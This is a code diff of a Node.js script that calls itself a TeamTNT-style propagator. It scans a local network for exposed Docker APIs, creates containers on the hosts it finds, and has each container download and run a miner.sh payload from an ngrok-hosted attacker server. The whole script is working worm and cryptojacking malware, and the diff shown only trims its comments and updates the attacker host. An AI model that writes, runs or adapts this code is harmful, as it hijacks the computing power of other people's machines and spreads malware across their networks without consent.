@@ -4,7 +4,14 @@ const winston = require('winston');
 const net = require('net');
 const os = require('os');
 
-// Configure logging for this script
+try {
+    require('async-sema');
+} catch (e) {
+    console.error("Error: 'async-sema' module not found. Install it using 'npm install async-sema'.");
+    process.exit(1);
+}
+
+// Configure logging
 const logger = winston.createLogger({
     level: 'info',
     format: winston.format.combine(
@@ -17,26 +24,21 @@ const logger = winston.createLogger({
     ]
 });
 
-// Resource usage configurations for the scanner itself
+// Resource usage configurations
 const MODE_CONFIGS = {
     low: { threads: 10, delay: 1000, mode: 'low' },
     medium: { threads: 30, delay: 500, mode: 'medium' },
     high: { threads: 50, delay: 250, mode: 'high' }
 };
 
-// Base configuration matching the other scripts
+// Base configuration
 const CONFIG = {
-    ATTACKER_IP: 'a834-2601-152-4d00-3f00-bd47-151e-f9bc-eb40.ngrok-free.app',
+    ATTACKER_IP: '3bd6-2601-152-4d00-3f00-bd47-151e-f9bc-eb40.ngrok-free.app',
     ATTACKER_PORT: '8080',
     DOCKER_PORT: 2375,
     TIMEOUT: 3000
 };
 
-/**
- * Checks if a Docker API port is open on a target IP.
- * @param {string} targetIp - The IP address to check.
- * @returns {Promise<boolean>} - True if the port is open, false otherwise.
- */
 async function checkDockerApi(targetIp) {
     return new Promise((resolve) => {
         const socket = new net.Socket();
@@ -44,7 +46,7 @@ async function checkDockerApi(targetIp) {
 
         socket.on('connect', () => {
             socket.destroy();
-            resolve(true); // Port is open
+            resolve(true);
         });
         socket.on('error', () => resolve(false));
         socket.on('timeout', () => resolve(false));
@@ -53,15 +55,8 @@ async function checkDockerApi(targetIp) {
     });
 }
 
-/**
- * Exploits an open Docker API by deploying the miner.sh container.
- * @param {string} targetIp - The vulnerable IP address.
- * @param {object} modeConfig - The resource mode for the deployed miner.
- * @returns {Promise<boolean>} - True if exploitation was successful.
- */
 async function exploitDockerApi(targetIp, modeConfig) {
     const attackerUrl = `http://${CONFIG.ATTACKER_IP}:${CONFIG.ATTACKER_PORT}`;
-    // The command downloads and runs the main shell payload
     const command = `sh -c 'wget ${attackerUrl}/miner.sh -O /tmp/miner.sh && chmod +x /tmp/miner.sh && /tmp/miner.sh --mode ${modeConfig.mode}'`;
 
     const containerConfig = {
@@ -74,16 +69,12 @@ async function exploitDockerApi(targetIp, modeConfig) {
     };
 
     try {
-        // Create the container
         const createResponse = await axios.post(`http://${targetIp}:${CONFIG.DOCKER_PORT}/containers/create`, containerConfig, { timeout: CONFIG.TIMEOUT });
-        
-        if (createResponse.status === 201) { // 201 Created
+        if (createResponse.status === 201) {
             const containerId = createResponse.data.Id;
             logger.info(`Container created on ${targetIp}`);
-            
-            // Start the container
             const startResponse = await axios.post(`http://${targetIp}:${CONFIG.DOCKER_PORT}/containers/${containerId}/start`, {}, { timeout: CONFIG.TIMEOUT });
-            if (startResponse.status === 204) { // 204 No Content (Success)
+            if (startResponse.status === 204) {
                 logger.info(`SUCCESS: Miner propagated to ${targetIp} in ${modeConfig.mode} mode.`);
                 return true;
             }
@@ -99,11 +90,6 @@ async function exploitDockerApi(targetIp, modeConfig) {
     }
 }
 
-/**
- * Scans a given IP range for open Docker APIs and attempts to exploit them.
- * @param {string} ipRange - The base IP range (e.g., '192.168.1').
- * @param {object} modeConfig - The configuration for scanning speed and payload deployment.
- */
 async function scanIpRange(ipRange, modeConfig) {
     const baseIp = ipRange || os.networkInterfaces().eth0?.[0]?.address?.split('.').slice(0, 3).join('.') || '192.168.1';
     const targets = [];
@@ -135,9 +121,6 @@ async function scanIpRange(ipRange, modeConfig) {
     logger.info("Local network scan complete.");
 }
 
-/**
- * Main function to parse arguments and start the scanner.
- */
 async function main() {
     const parser = new argparse.ArgumentParser({ description: 'TeamTNT-style local network propagator for Docker.' });
     parser.add_argument('--mode', { choices: ['low', 'medium', 'high'], default: 'medium', help: 'Scanning and deployment mode.' });
